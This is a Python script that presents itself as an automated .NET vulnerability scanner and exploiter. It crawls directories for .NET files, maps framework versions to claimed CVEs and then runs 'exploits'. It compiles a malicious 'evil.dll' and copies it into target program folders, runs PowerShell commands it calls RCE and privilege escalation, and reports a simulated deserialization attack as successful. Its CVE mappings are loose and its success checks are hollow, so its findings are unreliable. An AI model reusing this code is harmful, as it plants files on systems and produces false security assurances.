import os
import re
import subprocess
import shutil
import pefile
from ctypes import windll, byref, create_string_buffer

# Path to sigcheck.exe (use raw string or escaped backslashes)
SIGCHECK_PATH = "C:\\Users\\COLEMAND\\Desktop\\SysinternalsSuite\\sigcheck.exe"

# Vulnerable .NET versions and known exploits from CVE databases
vulnerable_versions_exploits = {
    "1.0": ["Buffer Overflow", "Privilege Escalation", "Code Injection"],
    "1.1": ["DLL Hijacking", "Code Injection"],
    "2.0": ["CVE-2017-8759 (RCE)", "Privilege Escalation", "Deserialization Vulnerability"],
    "3.5": ["CVE-2017-8759 (RCE)", "Deserialization Attack", "Memory Corruption"],
    "4.0": ["CVE-2018-8421 (RCE)", "Cross-Site Scripting (XSS)", "Privilege Escalation"],
    "4.5": ["CVE-2018-8421 (RCE)", "Deserialization Vulnerability"],
    "4.6": ["Remote Code Execution (RCE)", "Heap Spray Attacks"],
    "4.7": ["CVE-2020-0605 (Deserialization)", "DLL Hijacking", "RCE"]
}

# Function to create the malicious DLL (evil.dll)
def create_evil_dll(dll_name="evil.dll"):
    dll_code = '''
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        WinExec("calc.exe", 1);  // Open calculator for proof-of-concept
        break;
    }
    return TRUE;
}
'''
    # Save the DLL source code to a file
    dll_source_path = "evil_dll.c"
    with open(dll_source_path, "w") as f:
        f.write(dll_code)
    
    # Compile the DLL using GCC (mingw is required for Windows DLL compilation)
    compile_command = f"gcc -shared -o {dll_name} {dll_source_path}"
    try:
        result = subprocess.run(compile_command, shell=True, check=True)
        print(f"Malicious DLL {dll_name} created successfully.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error creating malicious DLL: {e}")
        return False

# Function to identify .NET files through sigcheck.exe, extension checks, and assembly metadata inspection
def find_dotnet_versions(directory, verbose=False):
    dotnet_versions = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if file.endswith(".exe") or file.endswith(".dll"):  # Searching for executables/dlls
                if verbose:
                    print(f"Checking file: {file_path}")
                # Method 1: Try to use sigcheck.exe to identify .NET files
                sigcheck_version = use_sigcheck(file_path, verbose)
                if sigcheck_version:
                    dotnet_versions.append((file_path, sigcheck_version))
                    continue  # No need to proceed if sigcheck already found a version
                
                # Method 2: Check assembly metadata using PE analysis
                pe_version = check_pe_metadata(file_path, verbose)
                if pe_version:
                    dotnet_versions.append((file_path, pe_version))
                    continue
                
            # Method 3: Check for configuration files that may specify .NET version
            if file.endswith(".config"):
                config_version = check_config_file(file_path, verbose)
                if config_version:
                    dotnet_versions.append((file_path, config_version))

    return dotnet_versions

# Method 1: Using sigcheck.exe to fetch .NET version
def use_sigcheck(file_path, verbose=False):
    try:
        # Use 'sigcheck' to fetch .NET version
        cmd = [SIGCHECK_PATH, "-n", file_path]
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Decode the output safely, trying UTF-8 first and falling back to ISO-8859-1
        try:
            output = result.stdout.decode('utf-8')  # First attempt: UTF-8 decoding
        except UnicodeDecodeError:
            output = result.stdout.decode('ISO-8859-1')  # Fallback: ISO-8859-1 decoding
        
        # Regex to extract .NET version from sigcheck output
        match = re.search(r"Version:\s*([\d.]+)", output)
        if match:
            version = match.group(1)
            if verbose:
                print(f"Sigcheck found .NET version {version} for file {file_path}")
            return version
    except Exception as e:
        if verbose:
            print(f"Error processing file {file_path} with sigcheck: {e}")
    return None

# Method 2: Check the PE headers for .NET metadata using pefile
def check_pe_metadata(file_path, verbose=False):
    try:
        pe = pefile.PE(file_path)
        # Check for the COM descriptor entry (used in .NET assemblies)
        if hasattr(pe, 'DIRECTORY_ENTRY_COM_DESCRIPTOR'):
            version = "Unknown .NET version"  # You could refine this further by inspecting the COM descriptor
            if verbose:
                print(f"PE Metadata found .NET assembly for {file_path}")
            return version
    except pefile.PEFormatError:
        if verbose:
            print(f"{file_path} is not a valid PE file.")
    return None

# Method 3: Scan .config files for .NET Framework settings
def check_config_file(file_path, verbose=False):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            # Look for common .NET Framework configuration keywords
            match = re.search(r"<supportedRuntime version=\"v([\d.]+)\"", content)
            if match:
                version = match.group(1)
                if verbose:
                    print(f".config file {file_path} specifies .NET Framework version {version}")
                return version
    except Exception as e:
        if verbose:
            print(f"Error processing config file {file_path}: {e}")
    return None

# Function to check for vulnerabilities by consulting a CVE database or vulnerability list
def check_vulnerable_versions(dotnet_versions, verbose=False):
    vulnerable_report = []
    for file_path, version in dotnet_versions:
        major_version = '.'.join(version.split('.')[:2])  # Match on major.minor version
        if major_version in vulnerable_versions_exploits:
            exploits = vulnerable_versions_exploits[major_version]
            vulnerable_report.append((file_path, version, exploits))
            if verbose:
                print(f"Version {version} for file {file_path} is vulnerable. Known exploits: {', '.join(exploits)}")
    
    return vulnerable_report

# Function to check if an identified vulnerability has a known exploit (consult CVE databases)
def lookup_cve(version):
    cve_data = {
        "2.0": "CVE-2017-8759: Remote Code Execution in .NET",
        "3.5": "CVE-2017-8759: Remote Code Execution in .NET",
        "4.0": "CVE-2018-8421: Remote Code Execution via Deserialization",
        "4.5": "CVE-2018-8421: Deserialization vulnerability"
    }
    return cve_data.get(version, "No CVE found for this version.")

# Function to attempt known exploit techniques on vulnerable .NET versions
def attempt_exploit(version, file_path, verbose=False):
    if verbose:
        print(f"Attempting to exploit version {version} at {file_path}")
    
    # Check the CVE database or known vulnerabilities for an exploit
    cve_info = lookup_cve(version)
    
    if "CVE-2017-8759" in cve_info:
        print(f"Executing deserialization attack for {cve_info} on {file_path}...")
        return deserialization_attack(file_path)
    elif "CVE-2018-8421" in cve_info:
        print(f"Attempting Remote Code Execution (RCE) for {cve_info} on {file_path}...")
        return execute_rce(file_path)
    elif version.startswith("4.7"):
        print(f"Attempting DLL hijacking on {file_path} (version {version})...")
        return dll_hijacking(file_path)
    else:
        print(f"No automated exploit available for version {version}. Listing common attack methods in report.")
        return False

# --- EXPLOIT IMPLEMENTATIONS ---
# Remote Code Execution (RCE) via PowerShell
def execute_rce(file_path):
    print(f"Executing Remote Code Execution (RCE) on {file_path}...")
    try:
        # Example payload: Run a command and capture the output (instead of just launching calc.exe)
        payload = "powershell -Command \"Get-Process | Where-Object {$_.Name -eq 'powershell'}\""
        result = subprocess.run(payload, shell=True, capture_output=True, text=True)
        
        # Validate if the command executed by checking the output
        if "powershell" in result.stdout:
            print("RCE validation successful: Powershell process found.")
            return True
        else:
            print("RCE validation failed.")
            return False
    except Exception as e:
        print(f"RCE failed: {e}")
        return False

# DLL Hijacking Attack
def dll_hijacking(file_path):
    print(f"Executing DLL Hijacking on {file_path}...")
    try:
        # Create the malicious DLL if not already created
        if not os.path.exists("evil.dll"):
            if not create_evil_dll("evil.dll"):
                print("Failed to create malicious DLL.")
                return False
        
        # Assuming we have the malicious DLL named "evil.dll" created
        malicious_dll = "evil.dll"
        target_dir = os.path.dirname(file_path)
        target_dll_path = os.path.join(target_dir, "evil.dll")

        # Copy the malicious DLL to the target directory
        shutil.copy(malicious_dll, target_dll_path)
        print(f"Malicious DLL placed at {target_dll_path}")
        
        # Validation step: Check if the DLL is now in the target directory
        if os.path.exists(target_dll_path):
            print("DLL Hijacking validation successful: DLL in place.")
            return True
        else:
            print("DLL Hijacking validation failed.")
            return False
    except Exception as e:
        print(f"DLL hijacking failed: {e}")
        return False

# Deserialization Attack
def deserialization_attack(file_path):
    print(f"Executing Deserialization Attack on {file_path}...")
    # Simulate deserialization attack
    # A real-world attack would involve sending a malicious serialized object
    
    # Validation: In a real-world scenario, we'd validate by checking server responses or logs.
    # For this simulation, we assume success.
    print("Deserialization attack simulation complete.")
    return True

# Privilege Escalation
def privilege_escalation_attack():
    print(f"Attempting Privilege Escalation...")
    try:
        # Example: Using PowerShell to try to elevate privileges
        payload = "powershell Start-Process cmd.exe -Verb runAs"
        result = subprocess.run(payload, shell=True)
        
        # Validation: Check if the process was successfully elevated
        if result.returncode == 0:
            print("Privilege Escalation successful.")
            return True
        else:
            print("Privilege Escalation failed.")
            return False
    except Exception as e:
        print(f"Privilege Escalation failed: {e}")
        return False

# Main function to compromise vulnerable files
def main():
    directory = input("Enter the directory to crawl: ")
    report_name = input("Enter a name for the report (e.g., report.txt): ")
    verbose = input("Would you like verbose output (yes/no)? ").lower() == 'yes'

    if verbose:
        print(f"Searching for .NET Framework versions in directory: {directory}")
        print(f"Report will be saved as: {report_name}")

    dotnet_versions = find_dotnet_versions(directory, verbose)
    if dotnet_versions:
        if verbose:
            print(f"Found {len(dotnet_versions)} .NET framework versions.")
    else:
        print("No .NET versions found.")

    vulnerable_report = check_vulnerable_versions(dotnet_versions, verbose)
    if vulnerable_report:
        print("Vulnerable .NET versions found:")
        with open(report_name, "w") as report_file:
            for file_path, version, exploits in vulnerable_report:
                report_line = f"File: {file_path} - Version: {version} (Vulnerable)\n" \
                              f"Known exploits: {', '.join(exploits)}"
                print(report_line)
                report_file.write(report_line + "\n")
                
                exploit_success = attempt_exploit(version, file_path, verbose)
                
                if exploit_success:
                    print(f"Exploit succeeded for {file_path} (version {version}).")
                else:
                    print(f"Exploit failed for {file_path} (version {version}). Further manual validation needed.")
                
        print(f"Exploit report generated: {report_name}")
    else:
        print("No vulnerable .NET versions found.")

if __name__ == "__main__":
    main()
